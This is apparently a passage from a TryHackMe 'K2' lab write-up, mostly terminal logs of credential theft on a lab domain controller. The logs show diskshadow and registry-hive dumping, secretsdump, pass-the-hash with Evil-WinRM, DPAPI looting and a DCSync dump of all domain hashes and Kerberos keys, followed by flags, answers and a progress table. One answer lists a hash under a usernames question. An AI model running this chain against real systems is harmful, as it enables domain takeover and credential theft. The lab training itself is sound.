NT AUTHORITY\This Organization             Well-known group S-1-5-15                                     Mandatory group, Enabled by default, Enabled group
K2\IT Staff 1                              Alias            S-1-5-21-1966530601-3185510712-10604624-1116 Mandatory group, Enabled by default, Enabled group, Local Group
NT AUTHORITY\NTLM Authentication           Well-known group S-1-5-64-10                                  Mandatory group, Enabled by default, Enabled group
Mandatory Label\High Mandatory Level       Label            S-1-16-12288
*Evil-WinRM* PS C:\Users\j.smith\Documents> dir
*Evil-WinRM* PS C:\Users\j.smith\Documents> cd ..
*Evil-WinRM* PS C:\Users\j.smith> dir


    Directory: C:\Users\j.smith


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-r---        5/29/2023  11:01 PM                Desktop
d-r---        5/29/2023  10:23 PM                Documents
d-r---        9/15/2018   7:19 AM                Downloads
d-r---        9/15/2018   7:19 AM                Favorites
d-r---        9/15/2018   7:19 AM                Links
d-r---        9/15/2018   7:19 AM                Music
d-r---        9/15/2018   7:19 AM                Pictures
d-----        9/15/2018   7:19 AM                Saved Games
d-r---        9/15/2018   7:19 AM                Videos


*Evil-WinRM* PS C:\Users\j.smith> cd Desktop
*Evil-WinRM* PS C:\Users\j.smith\Desktop> dir


    Directory: C:\Users\j.smith\Desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        6/21/2016   3:36 PM            527 EC2 Feedback.website
-a----        6/21/2016   3:36 PM            554 EC2 Microsoft Windows Guide.website
-a----        5/29/2023  11:01 PM             38 user.txt


*Evil-WinRM* PS C:\Users\j.smith\Desktop> type user.txt
THM{3e5a19a9ba91881f4d7852d92126a97f}
*Evil-WinRM* PS C:\Users\j.smith\Desktop> 















root@ip-10-201-108-225:~/K2# cat super.dsh
set context persistent nowriters
add volume c: alias priv
create
expose %priv% z:





:~/K2# apt install dos2unix



:~/K2# unix2dos super.dsh
unix2dos: converting file super.dsh to DOS format...



*Evil-WinRM* PS C:\Users\j.smith\Documents> upload super.dsh
                                        
Info: Uploading /root/K2/super.dsh to C:\Users\j.smith\Documents\super.dsh
                                        
Data: 112 bytes of 112 bytes copied
                                        
Info: Upload successful!
*Evil-WinRM* PS C:\Users\j.smith\Documents> 







*Evil-WinRM* PS C:\Temp> diskshadow /s c:\Users\j.smith\Documents\super.dsh
Microsoft DiskShadow version 1.0
Copyright (C) 2013 Microsoft Corporation
On computer:  K2SERVER,  9/29/2025 11:11:21 PM

-> set context persistent nowriters
-> add volume c: alias priv
-> create
Alias priv for shadow ID {f85d9909-865a-4116-85de-f8b1ba78e488} set as environment variable.
Alias VSS_SHADOW_SET for shadow set ID {2e66f56a-3074-4905-acbd-4323b521ff16} set as environment variable.

Querying all shadow copies with the shadow copy set ID {2e66f56a-3074-4905-acbd-4323b521ff16}

	* Shadow copy ID = {f85d9909-865a-4116-85de-f8b1ba78e488}		%priv%
		- Shadow copy set: {2e66f56a-3074-4905-acbd-4323b521ff16}	%VSS_SHADOW_SET%
		- Original count of shadow copies = 1
		- Original volume name: \\?\Volume{19127295-0000-0000-0000-100000000000}\ [C:\]
		- Creation time: 9/29/2025 11:11:22 PM
		- Shadow copy device name: \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1
		- Originating machine: K2Server.k2.thm
		- Service machine: K2Server.k2.thm
		- Not exposed
		- Provider ID: {b5946137-7b9f-4925-af80-51abd60b20d5}
		- Attributes:  No_Auto_Release Persistent No_Writers Differential

Number of shadow copies listed: 1
-> expose %priv% z:
-> %priv% = {f85d9909-865a-4116-85de-f8b1ba78e488}
The shadow copy was successfully exposed as z:\.
->
*Evil-WinRM* PS C:\Temp> dir


    Directory: C:\Temp


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        9/29/2025  11:11 PM            612 2025-09-29_23-11-22_K2SERVER.cab












*Evil-WinRM* PS C:\Users\j.smith\Desktop> reg save hklm\system C:\Users\j.smith\Desktop\system.bak
The operation completed successfully.

*Evil-WinRM* PS C:\Users\j.smith\Desktop> reg save hklm\sam C:\Users\j.smith\Desktop\sam.bak
The operation completed successfully.

*Evil-WinRM* PS C:\Users\j.smith\Desktop> dir


    Directory: C:\Users\j.smith\Desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        6/21/2016   3:36 PM            527 EC2 Feedback.website
-a----        6/21/2016   3:36 PM            554 EC2 Microsoft Windows Guide.website
-a----        9/29/2025  11:13 PM          53248 sam.bak
-a----        9/29/2025  11:13 PM       17244160 system.bak
-a----        5/29/2023  11:01 PM             38 user.txt



<img width="1216" height="382" alt="image" src="https://github.com/user-attachments/assets/5e933311-6046-44bd-a3dc-1089897aba27" />



*Evil-WinRM* PS C:\Users\j.smith\Desktop> download sam.bak
                                        
Info: Downloading C:\Users\j.smith\Desktop\sam.bak to sam.bak
                                        
Info: Download successful!




*Evil-WinRM* PS C:\Users\j.smith\Desktop> download system.bak
                                        
Info: Downloading C:\Users\j.smith\Desktop\system.bak to system.bak
                                        
Info: Download successful!


<img width="1198" height="247" alt="image" src="https://github.com/user-attachments/assets/b3a6ee4f-7c57-4e26-afe0-efc0e201684c" />







root@ip-10-201-108-225:~/K2# python3.9 /opt/impacket/build/scripts-3.9/secretsdump.py -sam sam.bak -system system.bak LOCAL
Impacket v0.10.1.dev1+20230316.112532.f0ac44bd - Copyright 2022 Fortra

[*] Target system bootKey: 0x36c8d26ec0df8b23ce63bcefa6e2d821
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:9545b61858c043477c350ae86c37b32f:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
[-] SAM hashes extraction for user WDAGUtilityAccount failed. The account doesn't have hash information.
[*] Cleaning up... 





<img width="1165" height="214" alt="image" src="https://github.com/user-attachments/assets/389c0e61-b706-4ed8-94e5-d584b1491a4b" />





root@ip-10-201-108-225:~/K2# evil-winrm -i 10.201.43.198 -u 'administrator' -H '9545b61858c043477c350ae86c37b32f'
                                        
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents> dir





*Evil-WinRM* PS C:\Users\Administrator\Desktop> dir


    Directory: C:\Users\Administrator\Desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        6/21/2016   3:36 PM            527 EC2 Feedback.website
-a----        6/21/2016   3:36 PM            554 EC2 Microsoft Windows Guide.website
-a----        5/29/2023  11:00 PM             37 root.txt


*Evil-WinRM* PS C:\Users\Administrator\Desktop> type root.txt
THM{a7e9c8149fec53865eff983143b1f5ba}


<img width="1149" height="299" alt="image" src="https://github.com/user-attachments/assets/8650e2d5-79c6-4b4d-9b2c-efad969a347f" />



<p>2.3. What is the root flag?<br>
<code>THM{a7e9c8149fec53865eff983143b1f5ba}</code></p>



<p>2.4. What is the Administrator's NTLM hash?<br>
<code>9545b61858c043477c350ae86c37b32f</code></p>p>







root@ip-10-201-108-225:~/K2# nxc smb 10.201.43.198 -d k2.thm -u Administrator -H '9545b61858c043477c350ae86c37b32f' --sam
SMB         10.201.43.198   445    K2SERVER         [*] Windows 10 / Server 2019 Build 17763 x64 (name:K2SERVER) (domain:k2.thm) (signing:True) (SMBv1:False) 
SMB         10.201.43.198   445    K2SERVER         [+] k2.thm\Administrator:9545b61858c043477c350ae86c37b32f (Pwn3d!)
SMB         10.201.43.198   445    K2SERVER         [*] Dumping SAM hashes
SMB         10.201.43.198   445    K2SERVER         Administrator:500:aad3b435b51404eeaad3b435b51404ee:9545b61858c043477c350ae86c37b32f:::
SMB         10.201.43.198   445    K2SERVER         Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
SMB         10.201.43.198   445    K2SERVER         DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
[00:28:15] ERROR    SAM hashes extraction for user WDAGUtilityAccount failed. The account doesn't have hash information.                      regsecrets.py:436
SMB         10.201.43.198   445    K2SERVER         [+] Added 3 SAM hashes to the database








root@ip-10-201-108-225:~/K2# nxc smb K2Server.k2.thm -u Administrator -H '9545b61858c043477c350ae86c37b32f' --dpapi
SMB         10.201.43.198   445    K2SERVER         [*] Windows 10 / Server 2019 Build 17763 x64 (name:K2SERVER) (domain:k2.thm) (signing:True) (SMBv1:False) 
SMB         10.201.43.198   445    K2SERVER         [+] k2.thm\Administrator:9545b61858c043477c350ae86c37b32f (Pwn3d!)
SMB         10.201.43.198   445    K2SERVER         [+] User is Domain Administrator, exporting domain backupkey...
SMB         10.201.43.198   445    K2SERVER         [*] Collecting DPAPI masterkeys, grab a coffee and be patient...
SMB         10.201.43.198   445    K2SERVER         [+] Got 73 decrypted masterkeys. Looting secrets...
SMB         10.201.43.198   445    K2SERVER         [SYSTEM][CREDENTIAL] Domain:batch=TaskScheduler:Task:{59BC6E03-A1C2-446D-BE80-E0228AAE02CF} - K2\Administrator:vz0q$i8b4c


<img width="1290" height="170" alt="image" src="https://github.com/user-attachments/assets/1b4edcb7-6ab2-4258-a15f-42533e26228a" />



<p>2.2. What are the usernames found on the server? List the usernames in alphabetical order separated by a comma. Exclude the Administrator user.<br>
<code>9545b61858c043477c350ae86c37b32f</code></p>

root@ip-10-201-108-225:~/K2# python3.9 /opt/impacket/build/scripts-3.9/secretsdump.py -just-dc Administrator:vz0q\$i8b4c@10.201.43.198
Impacket v0.10.1.dev1+20230316.112532.f0ac44bd - Copyright 2022 Fortra

[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:9545b61858c043477c350ae86c37b32f:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:52931bd82602fbebae7b2797b8e6d662:::
r.bud:1113:aad3b435b51404eeaad3b435b51404ee:dcf0d8694be31b7bbd835aa23b185979:::
j.bold:1114:aad3b435b51404eeaad3b435b51404ee:4c539059ae3310237a06f91c90fd395d:::
j.smith:1115:aad3b435b51404eeaad3b435b51404ee:2b576acbe6bcfda7294d6bd18041b8fe:::
K2SERVER$:1008:aad3b435b51404eeaad3b435b51404ee:e5b68684292474368245fcbab29a71b9:::
[*] Kerberos keys grabbed
Administrator:aes256-cts-hmac-sha1-96:15cf0a0cd0bc5aba8be271dd3beec499b0dd37ef1c4e77fc0506ed490f132a47
Administrator:aes128-cts-hmac-sha1-96:440442038131f232482d2e7ad57cab26
Administrator:des-cbc-md5:02268c98436879d3
krbtgt:aes256-cts-hmac-sha1-96:f1c9d0e6080699ab0e83f4e0346bdb543069377c6624a6481f7df3869b01d355
krbtgt:aes128-cts-hmac-sha1-96:fb5449ed6de55b41fd2de59b6735c93d
krbtgt:des-cbc-md5:4f29b5efa8f2a292
r.bud:aes256-cts-hmac-sha1-96:6c5bae5487134aab074b5e355cad6c5eaf6d5c36eef3fca4ae7735c167d78be2
r.bud:aes128-cts-hmac-sha1-96:f26651c80f9234f704164e41dcc5ddc7
r.bud:des-cbc-md5:8954041a978f02a8
j.bold:aes256-cts-hmac-sha1-96:54cdd00d219c64046d2e8a09d296fb6e41e415d540bd1e49d4478bb38684cd18
j.bold:aes128-cts-hmac-sha1-96:f313e3c88f360fb3ffb13accf22f56a8
j.bold:des-cbc-md5:5dea29dfb5ef894a
j.smith:aes256-cts-hmac-sha1-96:86aab858ae5276659ee85e12b174f9927c2fd01a0ce419fa0ec9b17a506d0648
j.smith:aes128-cts-hmac-sha1-96:eca28cdcefa8f6cf78bda46391c3a533
j.smith:des-cbc-md5:404f26b694c8d5ba
K2SERVER$:aes256-cts-hmac-sha1-96:b1c1afc108d339197fbaffc743c05ce06fd7543fee02d3c28af83c017b230545
K2SERVER$:aes128-cts-hmac-sha1-96:a170b8dcb1cc8f46c7701b7d8cd85869
K2SERVER$:des-cbc-md5:19191f7c01a7ecb5
[*] Cleaning up... 



<img width="1282" height="529" alt="image" src="https://github.com/user-attachments/assets/2239b735-6796-4de7-a381-bdeee63d5bc1" />


<br>
<br>
<br>

<h1 align="center">In Progress</h1>
<p align="center"><img width="1200px" src=" "><br>
                  <img width="1200px" src=" "></p>

<h1 align="center">My TryHackMe Journey ・ 2025, September</h1>

<div align="center"><h6>

| Date   | Room                                  |Streak   |All Time<br>Global|All Time<br>Brazil|Monthly<br>Global|Monthly<br>Brazil|Points|Rooms<br>Completed|Badges|
|:------:|:--------------------------------------|--------:|-------------:|-------------:|------------:|------------:|---------:|----------:|----------:|
|29      |Hard 🔗 - <strongK2</strong>, in progress| 511  |     109ᵗʰ    |      4ᵗʰ     |     210ᵗʰ    |     5ᵗʰ    | 127,880  |    981    |    76     |
|29      |Medium 🔗 - XDR: Credential Access     | 511    |     109ᵗʰ    |      4ᵗʰ     |     211ˢᵗ    |     5ᵗʰ    | 127,880  |    981    |    76     |
|29      |Medium 🚩 - XDR: Operation Global Dagger| 511   |     109ᵗʰ    |      4ᵗʰ     |     217ᵗʰ    |     5ᵗʰ    | 127,784  |    980    |    76     |
|28      |Hard 🚩 - Sea Surfer, in progress      | 510    |     -        |      4ᵗʰ     |     -        |     -      | -        |    979    |    76     |
|28      |Medium 🔗 - Windows PrivEsc Arena, in progress|510 | -         |      4ᵗʰ     |     -        |     -      | -        |    979    |    76     |
|27      |Medium 🚩 - Backtrack                  | 509    |     109ᵗʰ    |      4ᵗʰ     |     318ᵗʰ    |     5ᵗʰ    | 127,334  |    979    |    76     |
|26      |Medium 🚩 - ContainMe                  | 508    |     109ᵗʰ    |      4ᵗʰ     |     301ˢᵗ    |     5ᵗʰ    | 127,304  |    978    |    76     |
|26      |Medium 🚩 - Sequence                   | 508    |     110ᵗʰ    |      4ᵗʰ     |     301ˢᵗ    |     5ᵗʰ    | 127,274  |    977    |    76     |
|25      |Medium 🔗 - Introduction to Honeypots  | 507    |     109ᵗʰ    |      4ᵗʰ     |     305ᵗʰ    |     5ᵗʰ    | 127,214  |    976    |    76     |
|25      |Medium 🔗 - Windows x64 Assembly       | 507    |     109ᵗʰ    |      4ᵗʰ     |     303ʳᵈ    |     5ᵗʰ    | 127,110  |    975    |    76     | 
|25      |Easy 🔗 - Network Secuity Essentials   | 507    |     112ⁿᵈ    |      4ᵗʰ     |     302ⁿᵈ    |     5ᵗʰ    | 126,990  |    974    |    76     | 
|24      |Medium 🔗 - Linux Threat Detection 1   | 506    |     110ᵗʰ    |      4ᵗʰ     |     330ᵗʰ    |     5ᵗʰ    | 126,894  |    973    |    76     | 
|24      |Hard 🚩 - Iron Corp                    | 506    |     111ˢᵗ    |      4ᵗʰ     |     363ʳᵈ    |     5ᵗʰ    | 126,768  |    972    |    76     |    
|23      |Medium 🔗 - Intro to Credential Harvesting|505  |     109ᵗʰ    |      4ᵗʰ     |     346ᵗʰ    |     5ᵗʰ    | 126,768  |    971    |    76     |    
|22      |                                        | 504   |              |      4ᵗʰ     |              |             |         |            |    76     |    
|21      |                                        | 503   |              |      4ᵗʰ     |              |             |         |            |    76     |    
|20      |                                        | 502   |              |      4ᵗʰ     |              |             |         |            |    76     |    
|19      |                                        | 501   |              |      4ᵗʰ     |              |             |         |            |    76     |        
|18      |Easy 🔗 - Detecting Web DDos           | 500    |     106ᵗʰ    |      4ᵗʰ     |     312ⁿᵈ    |     4ᵗʰ    | 126,674  |    970    |    76     |
|17      |Medium 🔗 - DLL Hijacking              | 499    |     106ᵗʰ    |      4ᵗʰ     |     348ᵗʰ    |     7ᵗʰ    | 126,554  |    969    |    75     |
|17      |Medium 🔗 - The Docker Rodeo           | 499    |     106ᵗʰ    |      4ᵗʰ     |     346ᵗʰ    |     7ᵗʰ    | 126,546  |    968    |    75     |
|17      |Easy 🔗 - Linux Logging for SOC        | 499    |     106ᵗʰ    |      4ᵗʰ     |     345ᵗʰ    |     7ᵗʰ    | 126,538  |    967    |    74     |
|16      |Hard 🚩 - TryHack3M: TriCipher Summit  | 498    |     107ᵗʰ    |      4ᵗʰ     |     364ᵗʰ    |     7ᵗʰ    | 126,420  |    966    |    74     |
|16      |Easy 🔗 - Chaining Vulnerabilities     | 498    |     108ᵗʰ    |      5ᵗʰ     |     365ᵗʰ    |     7ᵗʰ    | 126,420  |    965    |    74     |
|15      |Medium 🔗 - AppSec IR                  | 497    |     108ᵗʰ    |      5ᵗʰ     |     352ⁿᵈ    |     7ᵗʰ    | 126,404  |    964    |    74     |
|14      |Hard 🚩 - Misguided Ghosts, in progress| 496    |     108ᵗʰ    |      5ᵗʰ     |     389ᵗʰ    |     6ᵗʰ    | 126,300  |    963    |    74     |
|14      |Hard 🚩 - VulnNet: Endgame             | 496    |     108ᵗʰ    |      5ᵗʰ     |     394ᵗʰ    |     6ᵗʰ    | 126,270  |    963    |    74     |
|13      |Hard 🚩 - Royal Router                 | 495    |     107ᵗʰ    |      5ᵗʰ     |     388ᵗʰ    |     6ᵗʰ    | 126,160  |    962    |    74     |
|13      |Medium 🚩 - Void Execution             | 495    |     107ᵗʰ    |      5ᵗʰ     |     383ʳᵈ    |     6ᵗʰ    | 126,120  |    961    |    73     |
|12      |Easy 🚩 - Invite Only                  | 494    |     110ᵗʰ    |      5ᵗʰ     |     352ⁿᵈ    |     6ᵗʰ    | 126,056  |    960    |    73     |
|12      |Medium 🚩 - Devie                      | 494    |     110ᵗʰ    |      5ᵗʰ     |     607ᵗʰ    |     9ᵗʰ    | 125,606  |    959    |    73     |
|11      |Medium 🚩 - Backtrack, in progress     | 493    |     110ᵗʰ    |      5ᵗʰ     |     629ᵗʰ    |     9ᵗʰ    | 125,516  |    958    |    73     |
|11      |Easy 🔗 - Detecting Web Attacks        | 493    |     110ᵗʰ    |      5ᵗʰ     |     629ᵗʰ    |     9ᵗʰ    | 125,516  |    958    |    73     |
|10      |Easy 🔗 - Attacking ICS Plant #1       | 492    |     110ᵗʰ    |      5ᵗʰ     |     675ᵗʰ    |     9ᵗʰ    | 125,428  |    957    |    73     |
|10      |Easy 🔗 - SOC Role in Blue Team        | 492    |     110ᵗʰ    |      5ᵗʰ     |     664ᵗʰ    |     9ᵗʰ    | 125,292  |    956    |    73     |
|9       |Hard 🚩 - Python Playground            | 491    |     111ˢᵗ    |      5ᵗʰ     |     693ʳᵈ    |     9ᵗʰ    | 125,236  |    955    |    73     |
|9       |Hard 🚩 - Borderlands                  | 491    |     111ˢᵗ    |      5ᵗʰ     |     713ʳᵈ    |    10ᵗʰ    | 125,146  |    954    |    73     |
|9       |Medium 🚩 - Forgotten Implant          | 491    |     112ⁿᵈ    |      5ᵗʰ     |     660ᵗʰ    |    10ᵗʰ    | 125,016  |    953    |    73     |
|8       |Easy 🔗 - Web Enumeration              | 490    |     112ⁿᵈ    |      5ᵗʰ     |     663ʳᵈ    |    10ᵗʰ    | 124,986  |    952    |    73     |
|8       |Easy 🔗 - iOS: Forensics               | 490    |     113ʳᵈ    |      5ᵗʰ     |     548ᵗʰ    |     9ᵗʰ    | 124,850  |    951    |    73     |
|7       |Medium 🚩 - VulnNet: Active            | 489    |     114ᵗʰ    |      5ᵗʰ     |     542ⁿᵈ    |     9ᵗʰ    | 124,746  |    950    |    73     |
|7       |Medium 🚩 - pyLon                      | 489    |     114ᵗʰ    |      5ᵗʰ     |     535ᵗʰ    |     9ᵗʰ    | 124,716  |    949    |    73     |
|7       |Medium 🚩 - Pressed                    | 489    |     113ʳᵈ    |      5ᵗʰ     |     508ᵗʰ    |     9ᵗʰ    | 124,886  |    948    |    73     |
|6       |Easy 🚩 - Classic Passwd               | 488    |     114ᵗʰ    |      5ᵗʰ     |     683ʳᵈ    |    12ⁿᵈ    | 124,476  |    947    |    73     |
|6       |Medium 🚩 - toc2                       | 488    |     114ᵗʰ    |      5ᵗʰ     |     695ᵗʰ    |    12ⁿᵈ    | 124,446  |    946    |    73     |
|6       |Hard 🚩 - Extract                      | 488    |     114ᵗʰ    |      5ᵗʰ     |     716ᵗʰ    |    13ʳᵈ    | 124,386  |    945    |    73     |
|6       |Medium 🚩 - Plotted-EMR                | 488    |     114ᵗʰ    |      5ᵗʰ     |     844ᵗʰ    |    12ⁿᵈ    | 124,326  |    944    |    73     |
|5       |Medium 🚩 - Inferno                    | 487    |     114ᵗʰ    |      5ᵗʰ     |     758ᵗʰ    |    12ⁿᵈ    | 124,236  |    943    |    73     |
|5       |Easy 🔗 - Psycho Break                 | 487    |     115ᵗʰ    |      5ᵗʰ     |     724ᵗʰ    |    10ᵗʰ    | 124,152  |    942    |    73     |
|4       |Medium 🚩 - Cold VVars                 | 486    |     113ʳᵈ    |      5ᵗʰ     |     579ᵗʰ    |    10ᵗʰ    | 124,048  |    941    |    73     |
|4       |Medium 🔗 - IP and Domain Threat Intel | 486    |     113ʳᵈ    |	     5ᵗʰ    |     579ᵗʰ     |    10ᵗʰ    | 124,018  |   940     |    73     |
|3       |Easy 🔗 - Malware Classification       | 485    |     112ⁿᵈ    |      5ᵗʰ     |     714ᵗʰ    |    13ʳᵈ    | 123,882  |    939    |    73     |
|2       |Medium 🔗 - Session Forensics          | 484    |     111ˢᵗ    |      5ᵗʰ     |     706ᵗʰ    |    14ᵗʰ    | 123,786  |    938    |    73     |
|1       |Medium 🚩 - Voyage                     | 483    |     111ˢᵗ    |      5ᵗʰ     |     849ᵗʰ    |    15ᵗʰ    | 123,636  |    937    |    73     |

</h6></div><br>

<br>


<p align="center">Global All Time:   109ᵗʰ<br><img width="250px"  src="https://github.com/user-attachments/assets/05d09f8f-b9ef-4ee5-b0ef-d7550ff3aed3"><br>
                                              <img width="1200px" src="https://github.com/user-attachments/assets/c7f8e791-0b74-4cb4-af4a-b218715895df"><br><br>
                  Brazil All Time:     4ᵗʰ<br><img width="1200px" src="https://github.com/user-attachments/assets/f5526c65-7f11-406d-9b1a-616f8371d757"><br>
                  Global monthly:    210ᵗʰ<br><img width="1200px" src="https://github.com/user-attachments/assets/90be15b0-c8f4-4bb4-a158-785c345ea135"><br>
                  Brazil monthly:      5ᵗʰ<br><img width="1200px" src="https://github.com/user-attachments/assets/10fcd78a-ca46-4a17-a686-269f1d412a8b"><br>

<h1 align="center">Thanks for coming!</h1>
<p align="center">Follow me on <a href="https://medium.com/@RosanaFS">Medium</a>, here on <a href="https://github.com/RosanaFSS/TryHackMe">GitHub</a>, and on <a href="https://www.linkedin.com/in/rosanafssantos/">LinkedIN</a>.</p>
